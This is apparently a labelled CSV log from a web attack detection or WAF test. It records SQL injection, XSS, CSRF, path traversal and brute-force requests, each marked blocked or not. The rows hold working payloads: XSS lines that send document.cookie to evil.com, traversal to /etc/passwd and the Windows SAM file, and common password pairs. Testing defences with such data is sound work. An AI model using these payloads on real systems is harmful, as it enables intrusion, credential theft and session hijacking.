timestamp,attack_type,payload_snippet,label,status_code,blocked
2026-07-04T21:11:26.355400,sqli,'; WAITFOR DELAY '00:00:05'--,1,403,True
2026-07-04T21:11:27.133430,sqli,1' OR '1'='1' /*,1,403,True
2026-07-04T21:11:29.779975,sqli,'; WAITFOR DELAY '00:00:05'--,1,403,True
2026-07-04T21:11:30.503336,sqli,1' OR '1'='1' /*,1,403,True
2026-07-04T21:11:34.139019,sqli,' AND 1=1--,1,403,True
2026-07-04T21:11:34.299857,sqli,1' OR '1'='1' /*,1,401,False
2026-07-04T21:11:35.235295,sqli,' AND 1=1--,1,403,True
2026-07-04T21:11:38.110231,sqli,' OR 1=1--,1,403,True
2026-07-04T21:11:41.305387,sqli,' OR '1'='1,1,403,True
2026-07-04T21:11:44.004791,sqli,' AND 1=1--,1,403,True
2026-07-04T21:11:46.473626,sqli,"' UNION SELECT @@version,NULL,NULL--",1,403,True
2026-07-04T21:11:48.956384,sqli,' OR 1=1--,1,403,True
2026-07-04T21:11:49.798156,sqli,' OR '1'='1,1,403,True
2026-07-04T21:11:49.915875,sqli,admin'--,1,401,False
2026-07-04T21:11:52.444685,sqli,"' UNION SELECT @@version,NULL,NULL--",1,403,True
2026-07-04T21:11:52.948945,benign,normal_request,0,401,False
2026-07-04T21:11:53.469605,benign,normal_request,0,401,False
2026-07-04T21:11:58.999738,benign,normal_request,0,N/A,False
2026-07-04T21:12:04.803433,benign,normal_request,0,N/A,False
2026-07-04T21:12:08.278109,benign,normal_request,0,403,False
2026-07-04T21:12:09.457504,benign,normal_request,0,401,False
2026-07-04T21:12:12.640664,benign,normal_request,0,403,False
2026-07-04T21:12:12.916995,benign,normal_request,0,200,False
2026-07-04T21:12:18.108084,benign,normal_request,0,403,False
2026-07-04T21:12:18.633449,benign,normal_request,0,401,False
2026-07-04T21:12:23.899906,xss,<svg onload=alert(1)>,1,403,True
2026-07-04T21:12:27.734743,xss,<script>alert(document.cookie)</script>,1,403,True
2026-07-04T21:12:31.490492,xss,<iframe src='javascript:alert(1)'>,1,403,True
2026-07-04T21:12:35.520012,xss,<scr<script>ipt>alert(1)</scr</script>ipt>,1,403,True
2026-07-04T21:12:39.610034,xss,<script>alert(document.cookie)</script>,1,403,True
2026-07-04T21:12:40.195424,xss,<script>fetch('http://evil.com/?c='+document.cookie)</script>,1,403,True
2026-07-04T21:12:40.831613,xss,<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>,1,403,True
2026-07-04T21:12:44.842201,xss,<div onmouseover=alert(1)>hover</div>,1,403,True
2026-07-04T21:12:45.518812,xss,<iframe src='javascript:alert(1)'>,1,403,True
2026-07-04T21:12:46.160905,xss,<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>,1,403,True
2026-07-04T21:12:48.316392,xss,<script>alert(document.cookie)</script>,1,429,True
2026-07-04T21:12:51.937183,xss,<div onmouseover=alert(1)>hover</div>,1,403,True
2026-07-04T21:12:52.123804,benign,normal_request,0,200,False
2026-07-04T21:12:52.383654,benign,normal_request,0,200,False
2026-07-04T21:12:53.419247,benign,normal_request,0,429,False
2026-07-04T21:12:54.249352,benign,normal_request,0,429,False
2026-07-04T21:12:59.698745,benign,normal_request,0,N/A,False
2026-07-04T21:13:01.961066,benign,normal_request,0,403,False
2026-07-04T21:13:02.240499,benign,normal_request,0,401,False
2026-07-04T21:13:02.628010,benign,normal_request,0,200,False
2026-07-04T21:13:03.946948,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,429,True
2026-07-04T21:13:04.746211,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,429,True
2026-07-04T21:13:05.400226,csrf,"{""action"": ""change_password"", ""new_password"": ""hacked123""}",1,429,True
2026-07-04T21:13:06.110036,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,429,True
2026-07-04T21:13:06.822445,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,429,True
2026-07-04T21:13:11.389204,csrf,"{""action"": ""delete_user"", ""user_id"": 123}",1,403,True
2026-07-04T21:13:16.913343,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,N/A,False
2026-07-04T21:13:17.919659,csrf,"{""action"": ""delete_user"", ""user_id"": 123}",1,429,True
2026-07-04T21:13:23.167804,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,N/A,False
2026-07-04T21:13:28.587465,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,N/A,False
2026-07-04T21:13:29.040417,benign,normal_request,0,401,False
2026-07-04T21:13:29.702911,benign,normal_request,0,200,False
2026-07-04T21:13:30.397892,benign,normal_request,0,429,False
2026-07-04T21:13:31.471704,benign,normal_request,0,429,False
2026-07-04T21:13:32.143639,benign,normal_request,0,200,False
2026-07-04T21:13:32.861117,benign,normal_request,0,401,False
2026-07-04T21:13:37.762044,path_traversal,../../../etc/passwd,1,403,True
2026-07-04T21:13:42.677132,path_traversal,..%252f..%252f..%252fetc%252fpasswd,1,403,True
2026-07-04T21:13:47.819867,path_traversal,..\..\..\windows\system32\config\sam,1,403,True
2026-07-04T21:13:48.464985,path_traversal,..\..\..\windows\system32\config\sam,1,429,True
2026-07-04T21:13:53.590271,path_traversal,..%252f..%252f..%252fetc%252fpasswd,1,403,True
2026-07-04T21:13:54.348009,path_traversal,../../../etc/passwd,1,429,True
2026-07-04T21:13:59.427314,path_traversal,..%252f..%252f..%252fetc%252fpasswd,1,403,True
2026-07-04T21:14:02.024446,path_traversal,/var/www/../../etc/passwd,1,403,True
2026-07-04T21:14:02.775028,path_traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,429,True
2026-07-04T21:14:03.694054,path_traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,429,True
2026-07-04T21:14:04.056938,benign,normal_request,0,200,False
2026-07-04T21:14:05.101655,benign,normal_request,0,429,False
2026-07-04T21:14:07.059468,benign,normal_request,0,429,False
2026-07-04T21:14:10.065924,benign,normal_request,0,429,False
2026-07-04T21:14:10.786957,benign,normal_request,0,401,False
2026-07-04T21:14:12.007876,benign,normal_request,0,429,False
2026-07-04T21:14:12.755185,benign,normal_request,0,200,False
2026-07-04T21:14:13.169067,benign,normal_request,0,401,False
2026-07-04T21:14:13.965115,brute_force,root:123456,1,429,True
2026-07-04T21:14:14.571377,brute_force,user:letmein,1,429,True
2026-07-04T21:14:15.299865,brute_force,test:Admin@123,1,429,True
2026-07-04T21:14:15.924912,brute_force,test:admin123,1,429,True
2026-07-04T21:14:16.466193,brute_force,admin:admin123,1,429,True
2026-07-04T21:14:21.535649,brute_force,user:password,1,403,True
2026-07-04T21:14:22.230061,brute_force,root:password,1,429,True
2026-07-04T21:14:22.852888,brute_force,admin:admin123,1,429,True
2026-07-04T21:14:23.527789,brute_force,admin:password,1,429,True
2026-07-04T21:14:28.707155,brute_force,root:Admin@123,1,N/A,False
2026-07-04T21:14:29.375634,brute_force,test:Admin@123,1,429,True
2026-07-04T21:14:34.473809,brute_force,admin:letmein,1,403,True
2026-07-04T21:14:34.947676,brute_force,user:admin123,1,429,True
2026-07-04T21:14:35.468663,brute_force,administrator:password,1,429,True
2026-07-04T21:14:38.021361,brute_force,admin:123456,1,429,True
2026-07-04T21:14:40.146507,brute_force,test:password,1,429,True
2026-07-04T21:14:45.309126,brute_force,administrator:letmein,1,N/A,False
2026-07-04T21:14:46.326642,brute_force,administrator:123456,1,429,True
2026-07-04T21:14:49.229904,brute_force,admin:password,1,403,True
2026-07-04T21:14:54.255906,brute_force,user:123456,1,403,True
2026-07-04T21:14:59.046440,brute_force,user:letmein,1,403,True
2026-07-04T21:15:03.930669,brute_force,admin:Admin@123,1,403,True
2026-07-04T21:15:08.381962,brute_force,administrator:Admin@123,1,403,True
2026-07-04T21:15:13.606549,brute_force,administrator:Admin@123,1,N/A,False
2026-07-04T21:15:16.402494,brute_force,root:123456,1,403,True
2026-07-04T21:15:21.068089,benign,normal_request,0,403,False
2026-07-04T21:15:21.551617,benign,normal_request,0,401,False
2026-07-04T21:15:26.300414,benign,normal_request,0,403,False
2026-07-04T21:15:26.829368,benign,normal_request,0,200,False
2026-07-04T21:15:27.347237,benign,normal_request,0,401,False
2026-07-04T21:15:28.376103,benign,normal_request,0,401,False
2026-07-04T21:15:29.077597,benign,normal_request,0,401,False
2026-07-04T21:15:29.806844,benign,normal_request,0,200,False
2026-07-04T21:15:30.098503,benign,normal_request,0,200,False
